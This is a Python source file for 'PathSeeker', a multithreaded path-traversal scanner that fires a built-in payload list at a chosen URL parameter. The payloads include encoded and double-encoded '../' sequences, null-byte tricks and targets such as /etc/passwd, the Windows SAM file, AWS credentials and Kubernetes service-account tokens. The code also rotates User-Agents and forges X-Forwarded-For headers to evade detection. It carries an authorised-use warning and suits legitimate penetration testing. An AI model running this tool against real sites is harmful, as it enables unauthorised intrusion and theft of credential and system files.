import requests
import time
import sys
import random
from urllib.parse import quote, urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
import os

DEFAULT_WORDLIST = [
    "../", "..\\", "/", "\\",
    "%2e%2e%2f", "%2e%2e%5c", "%c0%ae%c0%ae/", "%252e%252e%252f", "%252e%252e%255c",
    "....//", "....\\", "..//..//", "../../..//", "....//....//",
    "../%00", "../../etc/passwd%00", "../../windows/win.ini%00",
    "/etc/passwd", "/var/www/html/config.php", "C:\\Windows\\System32\\config\\SAM", "C:\\Windows\\win.ini",
    "/var/www/.aws/credentials", "/proc/self/root/etc/passwd", "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "../../../../../etc/passwd", "../../../../../windows/system32/drivers/etc/hosts",
    ".././../", "..%2f..%2f..%2f", "....%2f%2f....%2f%2f", "..;../", "..%252f..%252f"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"
]

print_lock = Lock()

def double_encode(payload):
    """Double-encode the payload for PathSeeker evasion."""
    return quote(quote(payload))

def get_random_headers():
    """Generate random headers with a random User-Agent for PathSeeker."""
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Connection": "keep-alive",
        "Referer": random.choice(["https://google.com", "https://bing.com", "https://yahoo.com"]),
        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    }

def build_url(base_url, param, payload):
    """Build URL by replacing the specified parameter with the payload for PathSeeker."""
    parsed_url = urlparse(base_url)
    query_dict = parse_qs(parsed_url.query)
    
    if param in query_dict:
        query_dict[param] = [payload]
    else:
        query_dict[param] = [payload]
    
    query_string = urlencode(query_dict, doseq=True)
    return f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"

def test_payload(base_url, param, payload, timeout=5):
    """Test a single payload against the target URL for PathSeeker."""
    try:
        headers = get_random_headers()
        url = build_url(base_url, param, payload)
        response = requests.get(url, headers=headers, timeout=timeout, allow_redirects=False)
        
        status = response.status_code
        content_length = len(response.content)
        content_snippet = response.text[:100].replace('\n', '') if content_length > 0 else "No content"
        
        result = {
            "url": url,
            "status": status,
            "length": content_length,
            "snippet": content_snippet
        }
        
        with print_lock:
            print(f"[>] {result['url']} | Status: {result['status']} | Length: {result['length']} | {result['snippet']}")
        
        return result
    except requests.RequestException as e:
        result = {"url": build_url(base_url, param, payload), "status": "Error", "length": 0, "snippet": str(e)}
        with print_lock:
            print(f"[>] {result['url']} | Status: {result['status']} | Length: {result['length']} | {result['snippet']}")
        return result

def run_path_traversal_test(base_url, param, wordlist, max_threads=10):
    """Run the PathSeeker test with threading."""
    print("[*] Starting PathSeeker Test...")
    print("[*] Target:", base_url)
    print("[*] Parameter:", param)
    print("[*] Total payloads:", len(wordlist) * 2)
    print("[*] Max threads:", max_threads)
    print("-")

    potential_vulns = []
    payloads = [(payload, double_encode(payload)) for payload in wordlist]

    def process_payload(payload_pair):
        payload, double_payload = payload_pair
        result = test_payload(base_url, param, payload)
        double_result = test_payload(base_url, param, double_payload)
        return result, double_result

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        results = executor.map(process_payload, payloads)
        
        for result, double_result in results:
            vuln_keywords = ["root", "passwd", "config", "aws", "secret", "admin", "key"]
            if result["status"] == 200 and result["length"] > 0:
                if any(keyword in result["snippet"].lower() for keyword in vuln_keywords):
                    potential_vulns.append(result)
            if double_result["status"] == 200 and double_result["length"] > 0:
                if any(keyword in double_result["snippet"].lower() for keyword in vuln_keywords):
                    potential_vulns.append(double_result)

    print("-")
    if potential_vulns:
        print("[!] PathSeeker Found Potential Vulnerabilities:")
        for vuln in potential_vulns:
            print(f"  - URL: {vuln['url']}")
            print(f"    Status: {vuln['status']}, Length: {vuln['length']}, Snippet: {vuln['snippet']}")
        
        action = input("\n[?] Vulnerable endpoint found! Continue testing (c), Skip (s), or Exit (e)? ").strip().lower()
        if action == "c":
            return True, potential_vulns
        elif action == "s":
            return False, potential_vulns
        else:
            sys.exit(0)
    else:
        print("[*] No clear vulnerabilities detected by PathSeeker. Check responses manually for subtle leaks.")
        return False, []

def save_results(vulns, output_file):
    """Save PathSeeker results to a file."""
    if not vulns:
        return
    try:
        with open(output_file, "w") as f:
            f.write("PathSeeker Vulnerability Results\n")
            f.write(f"Generated on: {time.ctime()}\n")
            f.write(f"Target: {vulns[0]['url'].split('?')[0]}\n")
            f.write("-" * 50 + "\n")
            for vuln in vulns:
                f.write(f"URL: {vuln['url']}\n")
                f.write(f"Status: {vuln['status']}, Length: {vuln['length']}, Snippet: {vuln['snippet']}\n\n")
        print(f"[+] PathSeeker results saved to {output_file}")
    except Exception as e:
        print(f"[!] Error saving PathSeeker results: {str(e)}")

def main():
    print("==========================================================")
    print("         PathSeeker                      ")
    print("----------------------------------------------------------")
    print("   Developed by Praveen Kavinda")
    print("   Website: https://prav33n.me")
    print("----------------------------------------------------------")
    print("~ WARNING: Use only on systems you own or have explicit permission to test! ~")
    print("==========================================================")

    base_url = input("Enter the base URL (e.g., https://prav33n.me/_next/image?url=TEST&test1=256&q=test2): ").strip()
    param = input("Enter the parameter to test (e.g., url): ").strip()
    custom_wordlist_path = input("Enter custom wordlist file path (leave blank to use default): ").strip()
    max_threads = input("Enter max threads (default 10): ").strip() or "10"

    if not base_url.startswith("http"):
        print("[!] Error: URL must start with http:// or https://")
        sys.exit(1)
    if not param:
        print("[!] Error: Parameter cannot be empty")
        sys.exit(1)

    try:
        max_threads = int(max_threads)
        if max_threads < 1:
            raise ValueError
    except ValueError:
        print("[!] Error: Max threads must be a positive integer")
        sys.exit(1)

    wordlist = DEFAULT_WORDLIST
    if custom_wordlist_path:
        try:
            with open(custom_wordlist_path, "r") as f:
                wordlist = [line.strip() for line in f if line.strip()]
            print("[+] PathSeeker loaded custom wordlist from:", custom_wordlist_path)
        except Exception as e:
            print("[!] PathSeeker failed to load custom wordlist:", str(e))
            sys.exit(1)

    continue_testing, vulns = run_path_traversal_test(base_url, param, wordlist, max_threads)

    if vulns:
        output_file = input("[?] Enter output file path to save PathSeeker results (leave blank to skip): ").strip()
        if output_file:
            save_results(vulns, output_file)

    if continue_testing:
        print("[*] PathSeeker continuing with additional tests (placeholder for future features)...")

if __name__ == "__main__":
    main()